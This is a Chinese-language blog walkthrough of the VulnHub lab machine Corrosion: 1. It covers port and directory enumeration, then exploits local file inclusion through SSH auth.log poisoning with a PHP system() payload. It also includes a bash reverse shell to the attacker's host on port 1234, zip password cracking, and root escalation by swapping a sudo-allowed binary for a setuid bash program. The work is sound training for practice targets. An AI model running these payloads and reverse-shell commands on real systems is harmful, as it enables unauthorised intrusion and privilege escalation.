{"pageProps":{"postData":{"id":"VulnhubCorrosion 1","contentHtml":"<h1>Corrosion: 1</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/corrosion-1,730/\">https://www.vulnhub.com/entry/corrosion-1,730/</a></p>\n</blockquote>\n<p>提示：枚举才是<code>key</code> ，所以大概要做很多的枚举</p>\n<h2>端口扫描主机发现</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>4</code>是靶机，<code>kali</code>的<code>ip</code>为<code>192.168.56.10</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-11 12:45 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00034</span>s latency).\nMAC Address: <span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">14</span> (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00019</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:F2:F8:<span class=\"hljs-title function_ invoke__\">E2</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00039</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:D4:B0:<span class=\"hljs-title function_ invoke__\">BE</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.10</span>\nHost is up.\nNmap done: <span class=\"hljs-number\">256</span> IP <span class=\"hljs-title function_ invoke__\">addresses</span> (<span class=\"hljs-number\">4</span> hosts up) scanned in <span class=\"hljs-number\">2.09</span> seconds\n</code></pre>\n</li>\n<li>\n<p>探测主机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-11 12:46 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0013</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:D4:B0:<span class=\"hljs-title function_ invoke__\">BE</span> (Oracle VirtualBox virtual NIC)\n</code></pre>\n</li>\n<li>\n<p>探测服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>     \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-11 12:46 CST</span>\nStats: <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">06</span> elapsed; <span class=\"hljs-number\">0</span> hosts <span class=\"hljs-title function_ invoke__\">completed</span> (<span class=\"hljs-number\">1</span> up), <span class=\"hljs-number\">1</span> undergoing Service Scan\nService scan Timing: About <span class=\"hljs-number\">50.00</span>% done; ETC: <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">46</span> (<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">06</span> remaining)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00038</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">8.4</span>p1 Ubuntu <span class=\"hljs-number\">5</span>ubuntu1 (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">46</span> ((Ubuntu))\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:D4:B0:<span class=\"hljs-title function_ invoke__\">BE</span> (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">4</span>.X|<span class=\"hljs-number\">5</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report any incorrect results at https:<span class=\"hljs-comment\">//nmap.org/submit/ .</span>\nNmap done: <span class=\"hljs-number\">1</span> IP <span class=\"hljs-title function_ invoke__\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">8.20</span> seconds\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nikto -host <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span> -port <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span>\n- Nikto v2<span class=\"hljs-number\">.5</span><span class=\"hljs-number\">.0</span>\n---------------------------------------------------------------------------\n---------------------------------------------------------------------------\n+ Target IP:          <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>\n+ Target Hostname:    <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>\n+ Target Port:        <span class=\"hljs-number\">80</span>\n+ Start Time:         <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">11</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">47</span>:05 (GMT8)\n---------------------------------------------------------------------------\n+ Server: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.46</span> (Ubuntu)\n+ /: The anti-clickjacking X-Frame-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-<span class=\"hljs-type\">Type</span>-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span>. This could allow the user agent to render the content of the site <span class=\"hljs-keyword\">in</span> a different fashion to the MIME <span class=\"hljs-built_in\">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class=\"hljs-built_in\">type</span>-header/\n+ No CGI Directories found (use <span class=\"hljs-string\">'-C all'</span> to force check <span class=\"hljs-built_in\">all</span> possible dirs)\n+ Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.46</span> appears to be outdated (current <span class=\"hljs-keyword\">is</span> at least Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.54</span>). Apache <span class=\"hljs-number\">2.2</span><span class=\"hljs-number\">.34</span> <span class=\"hljs-keyword\">is</span> the EOL <span class=\"hljs-keyword\">for</span> the <span class=\"hljs-number\">2.</span>x branch.\n+ /: Server may leak inodes via ETags, header found <span class=\"hljs-keyword\">with</span> file /, inode: 2aa6, size: 5c84b4033ab77, mtime: gzip. See: http://cve.mitre.org/cgi-<span class=\"hljs-built_in\">bin</span>/cvename.cgi?name=CVE-<span class=\"hljs-number\">2003</span>-<span class=\"hljs-number\">1418</span>\n+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .\n+ <span class=\"hljs-number\">8106</span> requests: <span class=\"hljs-number\">0</span> error(s) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">5</span> item(s) reported on remote host\n+ End Time:           <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">11</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">47</span>:<span class=\"hljs-number\">26</span> (GMT8) (<span class=\"hljs-number\">21</span> seconds)\n---------------------------------------------------------------------------\n+ <span class=\"hljs-number\">1</span> host(s) tested\n</code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>访问主页，是<code>Apache</code>的默认页面</p>\n<p><img src=\"/post-images/VulnhubCorrosion%201/image83.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>说了枚举是重要的，我们先扫目录</p>\n<pre><code class=\"hljs language-python\">gobuster <span class=\"hljs-built_in\">dir</span> -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>/ -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x htmp,php,<span class=\"hljs-built_in\">zip</span>,txt\n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>/\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              htmp,php,<span class=\"hljs-built_in\">zip</span>,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/.htmp                (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">277</span>]\n/.php                 (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">277</span>]\n/tasks                (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">312</span>] [--> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>/tasks/]\n/blog-post            (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">316</span>] [--> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>/blog-post/]\n/.htmp                (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">277</span>]\n/.php                 (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">277</span>]\n/server-status        (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">277</span>]\nProgress: <span class=\"hljs-number\">1102800</span> / <span class=\"hljs-number\">1102805</span> (<span class=\"hljs-number\">100.00</span>%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>发现<code>tasks</code>目录以及<code>blog-post</code> 目录</p>\n<ul>\n<li>\n<p>访问<code>tasks</code>目录，下面有一个txt问价<code>tasks_todo.txt</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># tasks_todo.txt</span>\n<span class=\"hljs-comment\"># Tasks that need to be completed</span>\n\n<span class=\"hljs-number\">1.</span> Change permissions <span class=\"hljs-keyword\">for</span> auth log\n<span class=\"hljs-number\">2.</span> Change port <span class=\"hljs-number\">22</span> -> <span class=\"hljs-number\">7672</span>\n<span class=\"hljs-number\">3.</span> <span class=\"hljs-type\">Set</span> up phpMyAdmin\n<span class=\"hljs-number\">1.</span> 更改身份验证日志的权限\n<span class=\"hljs-number\">2.</span> 将端口 <span class=\"hljs-number\">22</span> 更改为 <span class=\"hljs-number\">7672</span>\n<span class=\"hljs-number\">3.</span> 设置 phpMyAdmin\n</code></pre>\n</li>\n<li>\n<p>访问<code>blog-post</code> 目录</p>\n<p><img src=\"/post-images/VulnhubCorrosion%201/image84.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">Welcome to my Blog!\n\nThis website <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">in</span> development. Will be updated <span class=\"hljs-keyword\">in</span> the <span class=\"hljs-built_in\">next</span> couple Months! - randy\n</code></pre>\n<p>再扫描<code>blog-post</code> ，发现两个目录</p>\n<pre><code class=\"hljs language-python\">/archives             (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">325</span>] [--> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>/blog-post/archives/]\n/uploads              (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">324</span>] [--> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>/blog-post/uploads/]\n</code></pre>\n<p><code>archives</code>存在<code>randylogs.php</code></p>\n<p><code>uploads</code> 回到跟<code>index</code>一样</p>\n</li>\n</ul>\n</li>\n<li>\n<p>发现<code>randylogs.php</code> 根据提示关于日志的，应该会有<code>LFI</code> ，使用<code>wfuzz</code>测试一下</p>\n<pre><code class=\"hljs language-python\">wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt --hh <span class=\"hljs-number\">0</span>  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>/blog-post/archives/randylogs.php?FUZZ=/etc/passwd\n********************************************************\n* Wfuzz <span class=\"hljs-number\">3.1</span><span class=\"hljs-number\">.0</span> - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>/blog-post/archives/randylogs.php?FUZZ=/etc/passwd\nTotal requests: <span class=\"hljs-number\">951</span>\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                                          \n=====================================================================\n\n000000341:   <span class=\"hljs-number\">200</span>        <span class=\"hljs-number\">48</span> L     <span class=\"hljs-number\">85</span> W       <span class=\"hljs-number\">2832</span> Ch     <span class=\"hljs-string\">\"file\"</span>                                                                                                                                           \n\nTotal time: <span class=\"hljs-number\">1.095735</span>\nProcessed Requests: <span class=\"hljs-number\">951</span>\nFiltered Requests: <span class=\"hljs-number\">950</span>\nRequests/sec.: <span class=\"hljs-number\">867.9099</span>\n</code></pre>\n<p>发现参数<code>file</code> ，在浏览器访问，成功包含<code>/etc/passwd</code></p>\n<p><img src=\"/post-images/VulnhubCorrosion%201/image85.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>根据提示<code>Change permissions for auth log</code> 身份认证日志的权限，尝试包含<code>auth.log</code></p>\n<p><img src=\"/post-images/VulnhubCorrosion%201/image86.png\" alt=\"image.png\"></p>\n<p>成功包含，发现日志一直在更新，并且上面有<code>cron</code> ，可能存在<code>cron</code>任务</p>\n</li>\n<li>\n<p>因为可以包含<code>auth.log</code> （记录<code>ssh</code>登陆成功失败的日志），所以我们可以污染它</p>\n<p>但这里我遇到一个问题，我原本是想通过<code>ssh '&#x3C;?php system($_GET['c']); ?>'@192.168.56.4</code> 来进行登录然后污染日志文件的，但是报错了：<code>remote username contains invalid characters</code></p>\n<p><img src=\"/post-images/VulnhubCorrosion%201/image87.png\" alt=\"image.png\"></p>\n<p>网上查阅到信息：<a href=\"https://stackoverflow.com/questions/77948173/how-to-perform-ssh-log-poisoning-for-rce-with-lfi-using-php-system-call-in-usern\">https://stackoverflow.com/questions/77948173/how-to-perform-ssh-log-poisoning-for-rce-with-lfi-using-php-system-call-in-usern</a></p>\n<p>好像是因为<code>ssh</code> 版本过于新导致的，然后我开了<code>Ubuntu18.0.4</code> 去进行登录，成功了</p>\n<p><img src=\"/post-images/VulnhubCorrosion%201/image88.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>测试是否污染成功</p>\n<pre><code class=\"hljs language-python\">andylogs.php?file=/var/log/auth.log&#x26;c=whoami\n</code></pre>\n<pre><code class=\"hljs language-python\">Nov <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">39</span> corrosion sshd[<span class=\"hljs-number\">2517</span>]: Connection closed by invalid user www-data\n</code></pre>\n<p>爆出当前用户名<code>www-data</code> 污染成功</p>\n</li>\n<li>\n<p>进行反弹<code>shell</code> ，同时<code>kali</code>进行监听</p>\n<pre><code class=\"hljs language-python\">bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/192.168.56.10/1234 0>&#x26;1'</span>\n</code></pre>\n<p>进行URL编码</p>\n<pre><code class=\"hljs language-python\">bash+-c+%27bash+-i+%3e%<span class=\"hljs-number\">26</span>+%2fdev%2ftcp%2f192<span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.10</span>%2f1234+<span class=\"hljs-number\">0</span>%3e%<span class=\"hljs-number\">261</span>%<span class=\"hljs-number\">27</span>\n</code></pre>\n<p>进行反弹shell</p>\n<pre><code class=\"hljs language-python\">randylogs.php?file=/var/log/auth.log&#x26;c=bash+-c+<span class=\"hljs-string\">'bash+-i+>%26+%2fdev%2ftcp%2f192.168.56.10%2f1234+0>%261'</span>\n</code></pre>\n<p>获得<code>shell</code></p>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">www-data@corrosion:/var/www/html/blog-post/archives$ whoami\nwww-data\nwww-data@corrosion:/var/www/html/blog-post/archives$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\nwww-data@corrosion:/var/www/html/blog-post/archives$ uname -a\nLinux corrosion <span class=\"hljs-number\">5.11</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">25</span>-generic <span class=\"hljs-comment\">#27-Ubuntu SMP Fri Jul 9 23:06:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>寻找敏感文件</p>\n<ul>\n<li>\n<p>在<code>/var/backups</code>下发现文件<code>user_backups.zip</code> ,刚好有权限，我们将它复制到<code>/tmp</code>目录并且解压</p>\n<pre><code class=\"hljs language-python\">www-data@corrosion:/var/backups$ ls -al\n-rw-r--r--  <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">3285</span> Jul <span class=\"hljs-number\">30</span>  <span class=\"hljs-number\">2021</span> user_backup.<span class=\"hljs-built_in\">zip</span>\nwww-data@corrosion:/var/backups$ cp user_backup.<span class=\"hljs-built_in\">zip</span> /tmp\nwww-data@corrosion:/var/backups$ cd /tmp\nwww-data@corrosion:/tmp$ unzip user_backup.<span class=\"hljs-built_in\">zip</span>\nunzip user_backup.<span class=\"hljs-built_in\">zip</span>\nArchive:  user_backup.<span class=\"hljs-built_in\">zip</span>\n   skipping: id_rsa                  unable to get password\n   skipping: id_rsa.pub              unable to get password\n   skipping: my_password.txt         unable to get password\n   skipping: easysysinfo.c           unable to get password\n</code></pre>\n<p>发现需要密码，我们将它（靶机使用python搭建简易服务器）下载到<code>kali</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>破解<code>zip</code>文件</p>\n<p>使用<code>fcrackzip</code>工具进行破解，并且使用指点<code>rockyou</code> （破解率较高）</p>\n<pre><code class=\"hljs language-python\">fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u user_backup.<span class=\"hljs-built_in\">zip</span> \n\nPASSWORD FOUND!!!!: pw == !randybaby\n</code></pre>\n<p>破解出密码<code>!randybaby</code></p>\n</li>\n<li>\n<p>查看压缩包文件</p>\n<p>解压出四个文件 <code>id_rsa</code> <code>id_rsa.pub</code> <code>my_password.txt</code> <code>easysysinfo.c</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># my_password.txt 感觉像是randy用户的密码</span>\nrandylovesgoldfish1998\n</code></pre>\n</li>\n<li>\n<p>尝试使用密码登录<code>randy</code>账户</p>\n<pre><code class=\"hljs language-python\">ssh randy@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>                                 \nrandy@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span><span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 21.04 (GNU/Linux 5.11.0-25-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n119 updates can be installed immediately.\n0 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nLast login: Fri Jul 30 15:28:02 2021 from 10.0.0.69\n</span></code></pre>\n<p>登陆成功！！</p>\n</li>\n<li>\n<p>寻找敏感文件</p>\n<ul>\n<li>\n<p>在当前家目录下存在<code>user.txt</code></p>\n<pre><code class=\"hljs language-python\">randy@corrosion:~$ cat user.txt\n<span class=\"hljs-number\">98342721012390839081</span>\n</code></pre>\n</li>\n<li>\n<p><code>~/tools/</code>下存在 <code>easysysinfo</code> <code>easysysinfo.py</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">## eseysysinfo.py</span>\n<span class=\"hljs-comment\">#!/usr/bin/python3.9</span>\n<span class=\"hljs-keyword\">import</span> os\ncommand1 = <span class=\"hljs-string\">\"/usr/bin/date\"</span>\ncommand2 = <span class=\"hljs-string\">\"/usr/bin/cat /etc/hosts\"</span>\ncommand3 = <span class=\"hljs-string\">\"/usr/bin/uname -a\"</span>\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">output</span>():\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Today is: \"</span>)\n        os.system(command1)\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\\n\"</span>)\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Hosts File: \"</span>)\n        os.system(command2)\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\\n\"</span>)\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Kernal Version: \"</span>)\n        os.system(command3)\noutput()\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>查看权限</p>\n<p>可以使用<code>sudo</code>权限执行<code>/home/randy/tools/easysysinfo</code></p>\n<pre><code class=\"hljs language-python\">randy@corrosion:~/tools$ sudo -l                                                                                                                                          \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> randy on corrosion:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser randy may run the following commands on corrosion:\n    (root) PASSWD: /home/randy/tools/easysysinfo\n</code></pre>\n</li>\n<li>\n<p>因为我们可以<code>(root) PASSWD: /home/randy/tools/easysysinfo</code> 所以我们自己写一个c的提权文件替换原本的文件即可</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># #easysysinfo.c</span>\n<span class=\"hljs-comment\">#include &#x3C;unistd.h></span>\n<span class=\"hljs-comment\">#include &#x3C;stdlib.h></span>\n\nvoid main(){ \n        setuid(<span class=\"hljs-number\">0</span>);\n        setgid(<span class=\"hljs-number\">0</span>);\n        system(<span class=\"hljs-string\">\"bash -i\"</span>);\n}\n</code></pre>\n<p>然后编译该C语言文件</p>\n<pre><code class=\"hljs language-python\">gcc easysysinfo.c -o easysysinfo\n</code></pre>\n<p>执行</p>\n<pre><code class=\"hljs language-python\">randy@corrosion:~/tools$ sudo /home/randy/tools/easysysinfo\nroot@corrosion:/home/randy/tools<span class=\"hljs-comment\"># </span>\n</code></pre>\n<p>获得root！！！</p>\n</li>\n<li>\n<p>读取flag文件</p>\n<pre><code class=\"hljs language-python\">root@corrosion:~<span class=\"hljs-comment\"># cat root.txt </span>\nFLAG: 4NJSA99SD7922197D7S90PLAWE \n\nCongrats! Hope you enjoyed my first machine posted on VulnHub! \nPing me on twitter @proxyprgrammer <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">any</span> suggestions.\n\nYoutube: https://www.youtube.com/c/ProxyProgrammer\nTwitter: https://twitter.com/proxyprgrammer\n</code></pre>\n</li>\n</ol>\n<h2>总结</h2>\n<p>学到了思路，污染<code>auth.log</code>文件等</p>","title":"Vulnhub - Corrosion 1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Corrosion: 1 https://www.vulnhub.com/entry/corrosion 1,730/ 提示：枚举才是key ，所以大概要做很多的枚举 端口扫描主机发现 1. 探测存活主机，4是靶机，kali的ip为192.168.56.10 2. 探测主机所有开放端口 3. 探测服..."},"recentPosts":[{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"},{"id":"HackTheBoxSeason9 - NanoCorp","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","isEncrypted":true,"year":"2025","month":"11","day":"14"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Machine - Voleur","date":"2025-07-07","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Machine - RustyKey","date":"2025-06-30","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackMyVMKrustykrab","title":"HackMyVM - Krustykrab","date":"2025-04-18","isEncrypted":false,"year":"2025","month":"11","day":"12"}]},"__N_SSG":true}